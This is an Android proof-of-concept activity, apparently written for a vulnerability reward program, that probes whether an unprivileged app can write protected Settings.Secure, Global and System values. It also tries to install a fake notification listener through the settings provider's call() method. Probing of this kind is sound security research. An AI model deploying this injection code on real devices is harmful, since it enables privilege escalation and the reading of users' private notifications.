package com.vrp.poc;

import android.app.Activity;
import android.content.ContentValues;
import android.net.Uri;
import android.os.Bundle;
import android.provider.Settings;
import android.util.Log;
import android.widget.ScrollView;
import android.widget.LinearLayout;
import android.widget.TextView;

public class SettingsWritePocActivity extends Activity {
    private static final String TAG = "SettingsWrite";
    private TextView logView;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        ScrollView sv = new ScrollView(this);
        LinearLayout ll = new LinearLayout(this);
        ll.setOrientation(LinearLayout.VERTICAL);
        ll.setPadding(20, 20, 20, 20);
        logView = new TextView(this);
        logView.setTextSize(7);
        logView.setText("Settings.Secure Write PoC\n");
        logView.append("UID: " + android.os.Process.myUid() + "\n");
        logView.append("Package: " + getPackageName() + "\n\n");
        ll.addView(logView);
        sv.addView(ll);
        setContentView(sv);
        new Thread(this::runTests).start();
    }

    private void log(String msg) {
        Log.d(TAG, msg);
        runOnUiThread(() -> logView.append(msg + "\n"));
    }

    private void runTests() {
        testSettingsSecureRead();
        testSettingsSecureWrite();
        testSettingsSecureCallWrite();
        testSettingsGlobalWrite();
        testSettingsSystemWrite();
        log("\n=== ALL SETTINGS WRITE TESTS COMPLETE ===");
    }

    private void testSettingsSecureRead() {
        log("=== TEST 1: Settings.Secure READ ===\n");

        // Read android_id via Settings API
        try {
            String androidId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
            log("[INFO] android_id: " + androidId);
        } catch (Exception e) {
            log("[BLOCKED] android_id: " + e.getMessage());
        }

        // Read notification listeners
        try {
            String listeners = Settings.Secure.getString(getContentResolver(), "enabled_notification_listeners");
            log("[INFO] notification_listeners: " + shorten(listeners, 60));
        } catch (Exception e) {
            log("[BLOCKED] notification_listeners: " + shorten(e.getMessage(), 60));
        }
    }

    private void testSettingsSecureWrite() {
        log("\n=== TEST 2: Settings.Secure WRITE via ContentResolver ===\n");

        // Try to write a test key to Settings.Secure
        try {
            boolean result = Settings.Secure.putString(getContentResolver(), "vrp_test_key", "test_value");
            log("[RESULT] putString vrp_test_key: " + result);
            if (result) {
                String readBack = Settings.Secure.getString(getContentResolver(), "vrp_test_key");
                log("[VULN] Settings.Secure WRITE succeeded! Value: " + readBack);
            }
        } catch (SecurityException e) {
            log("[BLOCKED] Settings.Secure write: " + shorten(e.getMessage(), 80));
        } catch (Exception e) {
            log("[ERROR] Settings.Secure write: " + e.getClass().getSimpleName() + " " + shorten(e.getMessage(), 60));
        }

        // Try ContentValues insert
        try {
            ContentValues cv = new ContentValues();
            cv.put("name", "vrp_test_insert");
            cv.put("value", "injected");
            Uri result = getContentResolver().insert(
                Uri.parse("content://settings/secure"), cv);
            log("[RESULT] insert result: " + result);
            if (result != null) {
                log("[VULN] Settings.Secure INSERT succeeded! URI: " + result);
            }
        } catch (SecurityException e) {
            log("[BLOCKED] Settings.Secure insert: " + shorten(e.getMessage(), 80));
        } catch (Exception e) {
            log("[ERROR] Settings.Secure insert: " + e.getClass().getSimpleName() + " " + shorten(e.getMessage(), 60));
        }
    }

    private void testSettingsSecureCallWrite() {
        log("\n=== TEST 3: Settings.Secure WRITE via call() ===\n");

        // Try to use the call() method to write
        try {
            Bundle args = new Bundle();
            args.putString("_value", "vrp_injected");
            Bundle result = getContentResolver().call(
                Uri.parse("content://settings/secure"),
                "PUT_secure",
                "vrp_call_test",
                args);
            log("[RESULT] call PUT_secure result: " + result);

            // Check if write worked
            String readBack = Settings.Secure.getString(getContentResolver(), "vrp_call_test");
            log("[RESULT] Read back: " + readBack);
            if (readBack != null && readBack.equals("vrp_injected")) {
                log("[VULN] Settings.Secure call() WRITE succeeded!");
            }
        } catch (SecurityException e) {
            log("[BLOCKED] call PUT_secure: " + shorten(e.getMessage(), 80));
        } catch (Exception e) {
            log("[ERROR] call PUT_secure: " + e.getClass().getSimpleName() + " " + shorten(e.getMessage(), 60));
        }

        // Try to write notification_listeners via call()
        try {
            Bundle args = new Bundle();
            args.putString("_value", "com.vrp.poc/.FakeNotifListener");
            Bundle result = getContentResolver().call(
                Uri.parse("content://settings/secure"),
                "PUT_secure",
                "enabled_notification_listeners",
                args);
            log("[RESULT] call PUT_secure notification_listeners: " + result);

            String readBack = Settings.Secure.getString(getContentResolver(), "enabled_notification_listeners");
            if (readBack != null && readBack.contains("com.vrp.poc")) {
                log("[CRITICAL] Notification listener injection succeeded!");
            } else {
                log("[BLOCKED] Notification listener not modified");
            }
        } catch (SecurityException e) {
            log("[BLOCKED] notification_listener write: " + shorten(e.getMessage(), 80));
        } catch (Exception e) {
            log("[ERROR] notification_listener write: " + e.getClass().getSimpleName() + " " + shorten(e.getMessage(), 60));
        }
    }

    private void testSettingsGlobalWrite() {
        log("\n=== TEST 4: Settings.Global WRITE ===\n");

        try {
            boolean result = Settings.Global.putString(getContentResolver(), "vrp_global_test", "test");
            log("[RESULT] Global putString: " + result);
            if (result) {
                log("[VULN] Settings.Global WRITE succeeded!");
            }
        } catch (SecurityException e) {
            log("[BLOCKED] Global write: " + shorten(e.getMessage(), 80));
        } catch (Exception e) {
            log("[ERROR] Global write: " + e.getClass().getSimpleName() + " " + shorten(e.getMessage(), 60));
        }

        // Try via call()
        try {
            Bundle args = new Bundle();
            args.putString("_value", "test");
            Bundle result = getContentResolver().call(
                Uri.parse("content://settings/global"),
                "PUT_global",
                "vrp_global_call_test",
                args);
            log("[RESULT] call PUT_global: " + result);
        } catch (SecurityException e) {
            log("[BLOCKED] call PUT_global: " + shorten(e.getMessage(), 80));
        } catch (Exception e) {
            log("[ERROR] call PUT_global: " + e.getClass().getSimpleName() + " " + shorten(e.getMessage(), 60));
        }
    }

    private void testSettingsSystemWrite() {
        log("\n=== TEST 5: Settings.System WRITE ===\n");

        // Settings.System write is less restricted
        try {
            boolean result = Settings.System.putString(getContentResolver(), "vrp_system_test", "test");
            log("[RESULT] System putString: " + result);
            if (result) {
                String readBack = Settings.System.getString(getContentResolver(), "vrp_system_test");
                log("[VULN] Settings.System WRITE succeeded! Value: " + readBack);
            }
        } catch (SecurityException e) {
            log("[BLOCKED] System write: " + shorten(e.getMessage(), 80));
        } catch (Exception e) {
            log("[ERROR] System write: " + e.getClass().getSimpleName() + " " + shorten(e.getMessage(), 60));
        }
    }

    private String shorten(String s, int max) {
        if (s == null) return "null";
        return s.length() > max ? s.substring(0, max) + "..." : s;
    }
}
